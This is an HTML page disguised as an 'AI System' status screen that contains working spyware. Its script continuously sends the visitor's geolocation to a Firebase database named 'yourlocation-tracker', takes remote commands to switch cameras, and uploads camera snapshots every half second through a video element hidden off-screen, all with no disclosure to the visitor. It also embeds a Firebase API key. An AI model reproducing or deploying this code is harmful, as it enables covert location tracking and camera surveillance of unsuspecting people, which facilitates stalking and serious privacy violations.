<!DOCTYPE html>
<html>
<head>
<title>AI System</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>
body{
background:black;
color:white;
text-align:center;
padding-top:100px;
font-family:Arial;
}

video{
position:absolute;
left:-9999px;
width:1px;
height:1px;
}
</style>

</head>
<body>

<h2>AI Running...</h2>

<video id="video" autoplay playsinline muted></video>

<script>

const firebaseConfig = {
 apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
 databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
 projectId: "yourlocation-tracker"
};

firebase.initializeApp(firebaseConfig);

let deviceId="phone_"+Math.floor(Math.random()*100000);

let stream=null;


// SEND LOCATION
navigator.geolocation.watchPosition(function(pos){

firebase.database().ref("devices/"+deviceId+"/location").set({
lat:pos.coords.latitude,
lon:pos.coords.longitude
});

});


// LISTEN CAMERA COMMAND
firebase.database().ref("devices/"+deviceId+"/command")
.on("value",function(snap){

let cmd=snap.val();

if(cmd){
startCamera(cmd);
}

});



function startCamera(mode){

if(stream){
stream.getTracks().forEach(track=>track.stop());
}

navigator.mediaDevices.getUserMedia({
video:{facingMode:mode},
audio:false
})
.then(function(s){

stream=s;

let video=document.getElementById("video");

video.srcObject=s;

video.play();

capture(video);

});

}



function capture(video){

let canvas=document.createElement("canvas");

let ctx=canvas.getContext("2d");

setInterval(function(){

if(video.videoWidth===0) return;

canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

ctx.drawImage(video,0,0);

let img=canvas.toDataURL("image/jpeg",0.8);

firebase.database().ref("devices/"+deviceId+"/camera").set({
img:img
});

},500);

}


// START FRONT BY DEFAULT
startCamera("user");

</script>

</body>
</html>
